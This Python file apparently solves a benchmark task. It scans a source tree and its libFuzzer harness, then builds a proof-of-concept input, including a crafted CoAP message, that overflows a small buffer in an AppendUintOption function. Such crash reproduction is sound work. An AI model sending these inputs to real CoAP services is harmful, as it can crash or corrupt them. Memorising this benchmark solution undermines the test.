import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = self._load_sources(src_path)
        buf_size, value_bits = self._analyze_append_uint_option(texts)
        overflow_val = self._choose_overflow_value(buf_size, value_bits)

        fuzzer_text = self._find_fuzzer_text(texts)
        if fuzzer_text is not None and ("FuzzedDataProvider" in fuzzer_text) and ("AppendUintOption" in fuzzer_text):
            poc = self._build_provider_poc(fuzzer_text, buf_size, value_bits, overflow_val)
            if poc is not None and len(poc) > 0:
                return poc

        return self._build_coap_fallback(buf_size)

    def _load_sources(self, src_path: str) -> Dict[str, str]:
        texts: Dict[str, str] = {}
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not self._is_source_file(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size > 4_000_000:
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                        texts[p] = data.decode("utf-8", errors="ignore")
                    except OSError:
                        continue
            return texts

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    base = os.path.basename(name)
                    if not self._is_source_file(base):
                        continue
                    if m.size > 4_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    texts[name] = data.decode("utf-8", errors="ignore")
        except Exception:
            pass
        return texts

    def _is_source_file(self, filename: str) -> bool:
        filename = filename.lower()
        exts = (
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hh",
            ".hpp",
            ".inc",
            ".ipp",
            ".m",
            ".mm",
        )
        return filename.endswith(exts)

    def _find_fuzzer_text(self, texts: Dict[str, str]) -> Optional[str]:
        best = None
        best_score = -1
        for _, t in texts.items():
            if "LLVMFuzzerTestOneInput" not in t:
                continue
            score = 0
            if "FuzzedDataProvider" in t:
                score += 5
            if "AppendUintOption" in t:
                score += 10
            if "coap" in t.lower():
                score += 1
            if score > best_score:
                best_score = score
                best = t
        return best

    def _analyze_append_uint_option(self, texts: Dict[str, str]) -> Tuple[int, int]:
        buf_size = 4
        value_bits = 64

        func_text = None
        for _, t in texts.items():
            if "AppendUintOption" in t:
                func_text = t
                break

        if func_text is None:
            return buf_size, value_bits

        idx = func_text.find("AppendUintOption")
        if idx < 0:
            return buf_size, value_bits

        sig_start = max(0, func_text.rfind("\n", 0, idx))
        sig_end = func_text.find("{", idx)
        if sig_end == -1:
            sig_end = func_text.find(")", idx)
        sig = func_text[sig_start:sig_end if sig_end != -1 else idx + 2000]

        sig_l = sig.lower()
        if "uint32_t" in sig_l and "uint64_t" not in sig_l:
            value_bits = 32
        elif "uint64_t" in sig_l:
            value_bits = 64
        elif "size_t" in sig_l and "appenduintoption" in sig_l:
            value_bits = 64

        body = self._extract_function_body(func_text, idx)
        if body:
            sizes: List[int] = []
            for m in re.finditer(r"\buint8_t\s+\w+\s*\[\s*([^\]]+?)\s*\]\s*;", body):
                expr = m.group(1).strip()
                sz = self._eval_c_size_expr(expr)
                if sz is not None and 1 <= sz <= 64:
                    sizes.append(sz)
            if sizes:
                candidates = [s for s in sizes if s <= 16]
                if candidates:
                    buf_size = min(candidates)
                else:
                    buf_size = min(sizes)

        return buf_size, value_bits

    def _extract_function_body(self, text: str, name_idx: int) -> str:
        brace = text.find("{", name_idx)
        if brace == -1:
            return ""
        i = brace
        depth = 0
        n = len(text)
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[brace : i + 1]
            i += 1
        return text[brace:]

    def _eval_c_size_expr(self, expr: str) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None
        if re.fullmatch(r"\d+", expr):
            try:
                return int(expr)
            except Exception:
                return None
        m = re.fullmatch(r"sizeof\s*\(\s*([^)]+?)\s*\)", expr)
        if m:
            t = m.group(1).strip()
            t = t.replace("const", "").replace("volatile", "").strip()
            t = t.replace("unsigned ", "unsigned_").replace("long long", "long_long").replace("long", "long_")
            t = t.replace(" ", "")
            mp = {
                "uint8_t": 1,
                "int8_t": 1,
                "char": 1,
                "unsigned_char": 1,
                "uint16_t": 2,
                "int16_t": 2,
                "short": 2,
                "unsigned_short": 2,
                "uint32_t": 4,
                "int32_t": 4,
                "int": 4,
                "unsigned_int": 4,
                "long_": 8,
                "unsigned_long_": 8,
                "long_long": 8,
                "unsigned_long_long": 8,
                "uint64_t": 8,
                "int64_t": 8,
                "size_t": 8,
            }
            return mp.get(t)
        return None

    def _choose_overflow_value(self, buf_size: int, value_bits: int) -> int:
        if buf_size < 1:
            buf_size = 4
        target_bit = 8 * buf_size
        if value_bits > target_bit:
            return 1 << target_bit
        return (1 << value_bits) - 1

    def _type_to_size_bits(self, type_str: Optional[str]) -> Tuple[int, int]:
        if not type_str:
            return 8, 64
        t = type_str.strip()
        t = t.replace("const", "").replace("volatile", "").strip()
        t = t.replace("unsigned ", "unsigned_").replace("long long", "long_long").replace("long", "long_")
        t = t.replace(" ", "")
        mp = {
            "uint8_t": (1, 8),
            "int8_t": (1, 8),
            "char": (1, 8),
            "unsigned_char": (1, 8),
            "uint16_t": (2, 16),
            "int16_t": (2, 16),
            "short": (2, 16),
            "unsigned_short": (2, 16),
            "uint32_t": (4, 32),
            "int32_t": (4, 32),
            "int": (4, 32),
            "unsigned_int": (4, 32),
            "long_": (8, 64),
            "unsigned_long_": (8, 64),
            "long_long": (8, 64),
            "unsigned_long_long": (8, 64),
            "uint64_t": (8, 64),
            "int64_t": (8, 64),
            "size_t": (8, 64),
            "bool": (1, 8),
        }
        return mp.get(t, (8, 64))

    def _parse_int_literal(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        s = re.sub(r"[uUlL]+$", "", s)
        s = s.strip()
        try:
            return int(s, 0)
        except Exception:
            return None

    def _split_args(self, s: str) -> List[str]:
        args = []
        depth = 0
        cur = []
        i = 0
        while i < len(s):
            c = s[i]
            if c == "(":
                depth += 1
                cur.append(c)
            elif c == ")":
                depth -= 1
                cur.append(c)
            elif c == "," and depth == 0:
                args.append("".join(cur).strip())
                cur = []
            else:
                cur.append(c)
            i += 1
        tail = "".join(cur).strip()
        if tail:
            args.append(tail)
        return args

    def _build_provider_poc(self, fuzzer_text: str, buf_size: int, value_bits: int, overflow_val: int) -> Optional[bytes]:
        mprov = re.search(r"\bFuzzedDataProvider\s+(\w+)\s*\(", fuzzer_text)
        prov = mprov.group(1) if mprov else "provider"

        idx_f = fuzzer_text.find("LLVMFuzzerTestOneInput")
        if idx_f == -1:
            idx_f = 0
        idx_call = fuzzer_text.find("AppendUintOption", idx_f)
        if idx_call == -1:
            return None

        call_start = fuzzer_text.find("AppendUintOption", idx_call)
        paren = fuzzer_text.find("(", call_start)
        if paren == -1:
            return None
        end = self._find_matching_paren(fuzzer_text, paren)
        if end == -1:
            return None
        call_args_str = fuzzer_text[paren + 1 : end]
        args = self._split_args(call_args_str)
        if len(args) < 2:
            return None

        prefix = fuzzer_text[idx_f : end + 1]

        consume_re = re.compile(
            rf"\b{re.escape(prov)}\s*\.\s*(ConsumeIntegralInRange|ConsumeIntegral|ConsumeBool)\s*(?:<\s*([^>]+?)\s*>\s*)?\(\s*([^\)]*)\)",
            re.S,
        )

        actions: List[dict] = []
        var_to_action_idx: Dict[str, int] = {}

        for m in consume_re.finditer(prefix):
            method = m.group(1)
            tstr = m.group(2)
            argstr = m.group(3) if m.group(3) is not None else ""
            stmt_start = prefix.rfind(";", 0, m.start())
            if stmt_start == -1:
                stmt_start = prefix.rfind("{", 0, m.start())
            if stmt_start == -1:
                stmt_start = prefix.rfind("\n", 0, m.start())
            if stmt_start == -1:
                stmt_start = 0
            stmt = prefix[stmt_start + 1 : m.end()]
            vname = None
            am = re.search(r"\b(\w+)\s*=\s*" + re.escape(prov) + r"\s*\.\s*" + re.escape(method), stmt)
            if am:
                vname = am.group(1)

            size, bits = self._type_to_size_bits(tstr if method != "ConsumeBool" else "bool")
            a = {
                "method": method,
                "type": tstr,
                "size": size,
                "bits": bits,
                "range": None,
                "want": None,
                "vname": vname,
                "span": (m.start(), m.end()),
            }

            if method == "ConsumeIntegralInRange":
                parts = self._split_args(argstr)
                if len(parts) >= 2:
                    lo = self._parse_int_literal(parts[0])
                    hi = self._parse_int_literal(parts[1])
                    if lo is not None and hi is not None:
                        if lo > hi:
                            lo, hi = hi, lo
                        a["range"] = (lo, hi)

            actions.append(a)
            if vname:
                var_to_action_idx[vname] = len(actions) - 1

        # Determine which action corresponds to option number and value
        target_num_idx = None
        target_val_idx = None

        num_expr = args[0].strip()
        val_expr = args[1].strip()

        def find_action_for_expr(expr: str) -> Optional[int]:
            m2 = consume_re.search(expr)
            if m2:
                # Find matching action by span within prefix: use last consume occurrence with identical text near end.
                # Fallback: choose last action with same method+type.
                method = m2.group(1)
                tstr = m2.group(2)
                for i in range(len(actions) - 1, -1, -1):
                    if actions[i]["method"] == method and actions[i]["type"] == tstr:
                        return i
                return None
            mid = re.fullmatch(r"\b([A-Za-z_]\w*)\b", expr)
            if mid:
                v = mid.group(1)
                if v in var_to_action_idx:
                    return var_to_action_idx[v]
            return None

        target_num_idx = find_action_for_expr(num_expr)
        target_val_idx = find_action_for_expr(val_expr)

        if target_num_idx is None or target_val_idx is None:
            # try common variable names
            for cand in ("number", "option", "opt", "optionNumber", "aNumber"):
                if target_num_idx is None and cand in var_to_action_idx:
                    target_num_idx = var_to_action_idx[cand]
            for cand in ("value", "val", "optionValue", "aValue"):
                if target_val_idx is None and cand in var_to_action_idx:
                    target_val_idx = var_to_action_idx[cand]

        if target_num_idx is None or target_val_idx is None:
            # fall back to last two integral consumes
            integral_idxs = [i for i, a in enumerate(actions) if a["method"] != "ConsumeBool"]
            if len(integral_idxs) >= 2:
                target_num_idx = integral_idxs[-2]
                target_val_idx = integral_idxs[-1]
            else:
                return None

        # Assign default wants (small) to all actions to take paths without huge loops.
        for i, a in enumerate(actions):
            if a["method"] == "ConsumeBool":
                a["want"] = 1
            else:
                a["want"] = 1

        # Set option number and value wants
        actions[target_num_idx]["want"] = 14

        val_action = actions[target_val_idx]
        _, vbits = val_action["size"], val_action["bits"]
        vtarget = overflow_val
        # Ensure vtarget fits representable bits while still likely overflowing
        if vbits < 64:
            vmax = (1 << vbits) - 1
            if vtarget > vmax:
                vtarget = vmax
        val_action["want"] = vtarget

        # Build bytes in consume order
        out = bytearray()
        for a in actions:
            size = int(a["size"])
            want = int(a["want"]) if a["want"] is not None else 0
            method = a["method"]
            if method == "ConsumeBool":
                out.append(want & 0x01)
                continue

            rng = a["range"]
            if rng is not None:
                lo, hi = rng
                if want < lo:
                    want = lo
                elif want > hi:
                    want = hi
                raw = want - lo
            else:
                raw = want

            max_raw = (1 << (8 * size)) - 1
            raw &= max_raw
            out += int(raw).to_bytes(size, "little", signed=False)

        # Ensure minimal non-empty; optionally pad a tiny bit if too short
        if len(out) == 0:
            return None
        return bytes(out)

    def _find_matching_paren(self, s: str, open_idx: int) -> int:
        depth = 0
        i = open_idx
        while i < len(s):
            c = s[i]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    return i
            i += 1
        return -1

    def _build_coap_fallback(self, buf_size: int) -> bytes:
        # Construct a plausible CoAP message (21-ish bytes) with a uint option value requiring (buf_size+1) bytes.
        if buf_size < 1:
            buf_size = 4
        value_len = buf_size + 1
        value_bytes = b"\x01" + (b"\x00" * buf_size)  # big-endian encoding of 1 << (8*buf_size)

        # CoAP header: ver=1, type=CON(0), tkl=8
        token = b"\x00" * 8
        header = bytes([0x40 | 0x08, 0x01, 0x00, 0x01])  # GET, msgid=1

        # Option: Max-Age (14), delta=14 from 0
        option_number = 14
        prev = 0
        opt = self._encode_coap_option(option_number - prev, value_bytes)

        msg = header + token + opt
        # Pad to 21 bytes with payload marker + small payload if needed
        if len(msg) < 21:
            need = 21 - len(msg)
            if need >= 1:
                # Add payload marker and payload bytes
                payload = b"A" * max(0, need - 1)
                msg = msg + b"\xFF" + payload
            if len(msg) < 21:
                msg = msg + (b"\x00" * (21 - len(msg)))
        return msg

    def _encode_coap_option(self, delta: int, value: bytes) -> bytes:
        def enc_nibble(x: int) -> Tuple[int, bytes]:
            if x < 13:
                return x, b""
            if x < 269:
                return 13, bytes([x - 13])
            return 14, int(x - 269).to_bytes(2, "big", signed=False)

        d_n, d_ext = enc_nibble(delta)
        l_n, l_ext = enc_nibble(len(value))
        first = bytes([(d_n << 4) | l_n])
        return first + d_ext + l_ext + value